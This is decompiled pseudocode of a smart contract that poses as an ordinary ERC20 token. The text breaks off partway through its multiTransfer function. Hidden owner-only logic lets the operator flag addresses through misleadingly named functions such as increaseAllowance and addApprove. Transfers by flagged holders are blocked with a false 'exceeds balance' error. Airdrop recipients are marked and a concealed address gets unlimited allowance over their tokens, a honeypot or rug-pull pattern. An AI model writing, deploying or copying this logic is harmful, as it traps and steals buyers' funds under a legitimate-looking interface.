contract main {




// =====================  Runtime code  =====================


mapping of uint256 balanceOf;
mapping of uint8 stor1;
mapping of uint8 stor2;
uint256 stor3;
mapping of uint256 allowance;
uint256 totalSupply;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
address _owner;
address stor11;
address stor12;

function name() payable {
    return name[0 len name.length]
}

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return decimals
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function _owner() payable {
    return _owner
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function decreaseAllowance(address arg1) payable {
    require calldata.size - 4 >= 32
    if _owner != msg.sender:
        revert with 0, '!owner'
    stor11 = arg1
}

function _mint(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if _owner != msg.sender:
        revert with 0, 'ERC20: mint to the zero address'
    if arg2 + totalSupply < totalSupply:
        revert with 0, 'SafeMath: addition overflow'
    totalSupply += arg2
    if arg2 + balanceOf[stor10] < balanceOf[stor10]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[stor10] += arg2
    emit Transfer(arg2, 0, arg1);
}

function addApprove(address[] arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    if _owner != msg.sender:
        revert with 0, '!owner'
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        stor2[mem[(32 * idx) + 140 len 20]] = 1
        require idx < arg1.length
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 1
        stor1[mem[(32 * idx) + 140 len 20]] = 0
        idx = idx + 1
        continue 
}

function increaseAllowance(address[] arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    if _owner != msg.sender:
        revert with 0, '!owner'
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        stor1[mem[(32 * idx) + 140 len 20]] = 1
        require idx < arg1.length
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 2
        stor2[mem[(32 * idx) + 140 len 20]] = 0
        idx = idx + 1
        continue 
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if stor11 != _owner:
        if _owner == msg.sender:
            if msg.sender == arg1:
                stor3 = arg2
        else:
            if stor11 == msg.sender:
                if _owner == msg.sender:
                    if msg.sender == arg1:
                        stor3 = arg2
            else:
                if _owner == arg1:
                    if _owner == msg.sender:
                        if msg.sender == arg1:
                            stor3 = arg2
                else:
                    if bool(stor1[address(msg.sender)]) != 1:
                        if 1 == bool(stor2[address(msg.sender)]):
                            if stor11 != msg.sender:
                                if stor12 != arg1:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg2 >= stor3:
                                if stor11 != msg.sender:
                                    if stor12 != arg1:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if stor11 == arg1:
                                    stor2[address(msg.sender)] = 1
                                    stor1[address(msg.sender)] = 0
    else:
        if _owner == msg.sender:
            stor11 = arg1
        else:
            if stor11 == msg.sender:
                if _owner == msg.sender:
                    if msg.sender == arg1:
                        stor3 = arg2
            else:
                if _owner == arg1:
                    if _owner == msg.sender:
                        if msg.sender == arg1:
                            stor3 = arg2
                else:
                    if bool(stor1[address(msg.sender)]) != 1:
                        if 1 == bool(stor2[address(msg.sender)]):
                            if stor11 != msg.sender:
                                if stor12 != arg1:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg2 >= stor3:
                                if stor11 != msg.sender:
                                    if stor12 != arg1:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if stor11 == arg1:
                                    stor2[address(msg.sender)] = 1
                                    stor1[address(msg.sender)] = 0
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if arg2 > balanceOf[address(msg.sender)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(msg.sender)] -= arg2
    if arg2 + balanceOf[arg1] < balanceOf[arg1]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] = arg2 + balanceOf[arg1]
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if stor11 != _owner:
        if _owner == arg1:
            if arg1 == arg2:
                stor3 = arg3
        else:
            if stor11 == arg1:
                if _owner == arg1:
                    if arg1 == arg2:
                        stor3 = arg3
            else:
                if _owner == arg2:
                    if _owner == arg1:
                        if arg1 == arg2:
                            stor3 = arg3
                else:
                    if bool(stor1[address(arg1)]) != 1:
                        if 1 == bool(stor2[address(arg1)]):
                            if stor11 != arg1:
                                if stor12 != arg2:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg3 >= stor3:
                                if stor11 != arg1:
                                    if stor12 != arg2:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if stor11 == arg2:
                                    stor2[address(arg1)] = 1
                                    stor1[address(arg1)] = 0
    else:
        if _owner == arg1:
            stor11 = arg2
        else:
            if stor11 == arg1:
                if _owner == arg1:
                    if arg1 == arg2:
                        stor3 = arg3
            else:
                if _owner == arg2:
                    if _owner == arg1:
                        if arg1 == arg2:
                            stor3 = arg3
                else:
                    if bool(stor1[address(arg1)]) != 1:
                        if 1 == bool(stor2[address(arg1)]):
                            if stor11 != arg1:
                                if stor12 != arg2:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg3 >= stor3:
                                if stor11 != arg1:
                                    if stor12 != arg2:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if stor11 == arg2:
                                    stor2[address(arg1)] = 1
                                    stor1[address(arg1)] = 0
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(arg1)] -= arg3
    if arg3 + balanceOf[arg2] < balanceOf[arg2]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg2)] = arg3 + balanceOf[arg2]
    emit Transfer(arg3, arg1, arg2);
    if arg3 > allowance[address(arg1)][address(msg.sender)]:
        revert with 0, 
                    32,
                    40,
                    0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                    mem[264 len 24],
                    mem[312 len 8]
    if not arg1:
        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
    if not msg.sender:
        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}

function multiTransfer(uint256 arg1, address[] arg2, uint256[] arg3) payable {
    require calldata.size - 4 >= 96
    require arg2 <= 4294967296
    require arg2 + 36 <= calldata.size
    require arg2.length <= 4294967296 and arg2 + (32 * arg2.length) + 36 <= calldata.size
    mem[96] = arg2.length
    mem[128 len 32 * arg2.length] = call.data[arg2 + 36 len 32 * arg2.length]
    require arg3 <= 4294967296
    require arg3 + 36 <= calldata.size
    require arg3.length <= 4294967296 and arg3 + (32 * arg3.length) + 36 <= calldata.size
    mem[64] = (32 * arg2.length) + (32 * arg3.length) + 160
    mem[(32 * arg2.length) + 128] = arg3.length
    mem[(32 * arg2.length) + 160 len 32 * arg3.length] = call.data[arg3 + 36 len 32 * arg3.length]
    mem[(32 * arg2.length) + (32 * arg3.length) + 160] = 0
    if _owner != msg.sender:
        revert with 0, '!owner'
    idx = 0
    while idx < arg2.length:
        require idx < mem[96]
        _985 = mem[(32 * idx) + 128]
        require idx < mem[(32 * arg2.length) + 128]
        _987 = mem[(32 * idx) + (32 * arg2.length) + 160]
        if stor11 != _owner:
            if _owner == msg.sender:
                if mem[(32 * idx) + 140 len 20] != msg.sender:
                    if not msg.sender:
                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                    if not mem[(32 * idx) + 140 len 20]:
                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                    _1046 = mem[64]
                    mem[64] = mem[64] + 96
                    mem[_1046] = 38
                    mem[_1046 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                    mem[32] = 0
                    if _987 > balanceOf[address(msg.sender)]:
                        _1122 = mem[64]
                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                        mem[mem[64] + 4] = 32
                        mem[mem[64] + 36] = 38
                        idx = 0
                        while idx < 38:
                            mem[idx + _1122 + 68] = mem[idx + _1046 + 32]
                            idx = idx + 32
                            continue 
                        mem[_1122 + 100] = mem[_1122 + 126 len 6]
                        revert with memory
                          from mem[64]
                           len _1122 + -mem[64] + 132
                    balanceOf[address(msg.sender)] -= _987
                    if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                        revert with 0, 'SafeMath: addition overflow'
                    mem[0] = address(_985)
                    mem[32] = 0
                    balanceOf[address(_985)] += _987
                    mem[mem[64]] = _987
                    emit Transfer(_987, msg.sender, address(_985));
                    if idx < arg1:
                        require idx < mem[96]
                        stor1[mem[(32 * idx) + 140 len 20]] = 1
                        require idx < mem[96]
                        _1610 = mem[(32 * idx) + 128]
                        if not mem[(32 * idx) + 140 len 20]:
                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                        if not stor12:
                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                        mem[0] = stor12
                        mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                        allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                        mem[mem[64]] = -1
                        emit Approval(-1, address(_1610), stor12);
                else:
                    stor3 = mem[(32 * idx) + (32 * arg2.length) + 160]
                    if not msg.sender:
                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                    if not mem[(32 * idx) + 140 len 20]:
                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                    _1080 = mem[64]
                    mem[64] = mem[64] + 96
                    mem[_1080] = 38
                    mem[_1080 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                    mem[32] = 0
                    if _987 > balanceOf[address(msg.sender)]:
                        _1161 = mem[64]
                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                        mem[mem[64] + 4] = 32
                        mem[mem[64] + 36] = 38
                        idx = 0
                        while idx < 38:
                            mem[idx + _1161 + 68] = mem[idx + _1080 + 32]
                            idx = idx + 32
                            continue 
                        mem[_1161 + 100] = mem[_1161 + 126 len 6]
                        revert with memory
                          from mem[64]
                           len _1161 + -mem[64] + 132
                    balanceOf[address(msg.sender)] -= _987
                    if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                        revert with 0, 'SafeMath: addition overflow'
                    mem[0] = address(_985)
                    mem[32] = 0
                    balanceOf[address(_985)] += _987
                    mem[mem[64]] = _987
                    emit Transfer(_987, msg.sender, address(_985));
                    if idx < arg1:
                        require idx < mem[96]
                        stor1[mem[(32 * idx) + 140 len 20]] = 1
                        require idx < mem[96]
                        _1636 = mem[(32 * idx) + 128]
                        if not mem[(32 * idx) + 140 len 20]:
                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                        if not stor12:
                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                        mem[0] = stor12
                        mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                        allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                        mem[mem[64]] = -1
                        emit Approval(-1, address(_1636), stor12);
            else:
                if stor11 == msg.sender:
                    if _owner != msg.sender:
                        if not msg.sender:
                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                        if not mem[(32 * idx) + 140 len 20]:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                        _1048 = mem[64]
                        mem[64] = mem[64] + 96
                        mem[_1048] = 38
                        mem[_1048 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                        mem[32] = 0
                        if _987 > balanceOf[address(msg.sender)]:
                            _1125 = mem[64]
                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                            mem[mem[64] + 4] = 32
                            mem[mem[64] + 36] = 38
                            idx = 0
                            while idx < 38:
                                mem[idx + _1125 + 68] = mem[idx + _1048 + 32]
                                idx = idx + 32
                                continue 
                            mem[_1125 + 100] = mem[_1125 + 126 len 6]
                            revert with memory
                              from mem[64]
                               len _1125 + -mem[64] + 132
                        balanceOf[address(msg.sender)] -= _987
                        if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                            revert with 0, 'SafeMath: addition overflow'
                        mem[0] = address(_985)
                        mem[32] = 0
                        balanceOf[address(_985)] += _987
                        mem[mem[64]] = _987
                        emit Transfer(_987, msg.sender, address(_985));
                        if idx < arg1:
                            require idx < mem[96]
                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                            require idx < mem[96]
                            _1614 = mem[(32 * idx) + 128]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                            if not stor12:
                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                            mem[0] = stor12
                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                            mem[mem[64]] = -1
                            emit Approval(-1, address(_1614), stor12);
                    else:
                        if mem[(32 * idx) + 140 len 20] != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1082 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1082] = 38
                            mem[_1082 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _987 > balanceOf[address(msg.sender)]:
                                _1166 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[idx + _1166 + 68] = mem[idx + _1082 + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1166 + 100] = mem[_1166 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1166 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _987
                            if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_985)
                            mem[32] = 0
                            balanceOf[address(_985)] += _987
                            mem[mem[64]] = _987
                            emit Transfer(_987, msg.sender, address(_985));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1637 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1637), stor12);
                        else:
                            stor3 = mem[(32 * idx) + (32 * arg2.length) + 160]
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1128 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1128] = 38
                            mem[_1128 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _987 > balanceOf[address(msg.sender)]:
                                _1206 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[idx + _1206 + 68] = mem[idx + _1128 + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1206 + 100] = mem[_1206 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1206 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _987
                            if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_985)
                            mem[32] = 0
                            balanceOf[address(_985)] += _987
                            mem[mem[64]] = _987
                            emit Transfer(_987, msg.sender, address(_985));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1663 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1663), stor12);
                else:
                    if _owner == mem[(32 * idx) + 140 len 20]:
                        if _owner != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1096 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1096] = 38
                            mem[_1096 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _987 > balanceOf[address(msg.sender)]:
                                _1179 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[idx + _1179 + 68] = mem[idx + _1096 + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1179 + 100] = mem[_1179 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1179 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _987
                            if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_985)
                            mem[32] = 0
                            balanceOf[address(_985)] += _987
                            mem[mem[64]] = _987
                            emit Transfer(_987, msg.sender, address(_985));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1644 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1644), stor12);
                        else:
                            if mem[(32 * idx) + 140 len 20] != msg.sender:
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _1139 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_1139] = 38
                                mem[_1139 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _987 > balanceOf[address(msg.sender)]:
                                    _1216 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[idx + _1216 + 68] = mem[idx + _1139 + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_1216 + 100] = mem[_1216 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _1216 + -mem[64] + 132
                                balanceOf[address(msg.sender)] -= _987
                                if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                    revert with 0, 'SafeMath: addition overflow'
                                mem[0] = address(_985)
                                mem[32] = 0
                                balanceOf[address(_985)] += _987
                                mem[mem[64]] = _987
                                emit Transfer(_987, msg.sender, address(_985));
                                if idx < arg1:
                                    require idx < mem[96]
                                    stor1[mem[(32 * idx) + 140 len 20]] = 1
                                    require idx < mem[96]
                                    _1677 = mem[(32 * idx) + 128]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                    if not stor12:
                                        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                    mem[0] = stor12
                                    mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                    allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                    mem[mem[64]] = -1
                                    emit Approval(-1, address(_1677), stor12);
                            else:
                                stor3 = mem[(32 * idx) + (32 * arg2.length) + 160]
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _1182 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_1182] = 38
                                mem[_1182 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _987 > balanceOf[address(msg.sender)]:
                                    _1269 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[idx + _1269 + 68] = mem[idx + _1182 + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_1269 + 100] = mem[_1269 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _1269 + -mem[64] + 132
                                balanceOf[address(msg.sender)] -= _987
                                if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                    revert with 0, 'SafeMath: addition overflow'
                                mem[0] = address(_985)
                                mem[32] = 0
                                balanceOf[address(_985)] += _987
                                mem[mem[64]] = _987
                                emit Transfer(_987, msg.sender, address(_985));
                                if idx < arg1:
                                    require idx < mem[96]
                                    stor1[mem[(32 * idx) + 140 len 20]] = 1
                                    require idx < mem[96]
                                    _1727 = mem[(32 * idx) + 128]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                    if not stor12:
                                        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                    mem[0] = stor12
                                    mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                    allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                    mem[mem[64]] = -1
                                    emit Approval(-1, address(_1727), stor12);
                    else:
                        mem[0] = msg.sender
                        mem[32] = 1
                        if bool(stor1[address(msg.sender)]) == 1:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1060 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1060] = 38
                            mem[_1060 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _987 > balanceOf[address(msg.sender)]:
                                _1136 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[idx + _1136 + 68] = mem[idx + _1060 + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1136 + 100] = mem[_1136 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1136 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _987
                            if _987 + balanceOf[address(_985)] < balanceOf[address(_985)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_985)
                            mem[32] = 0
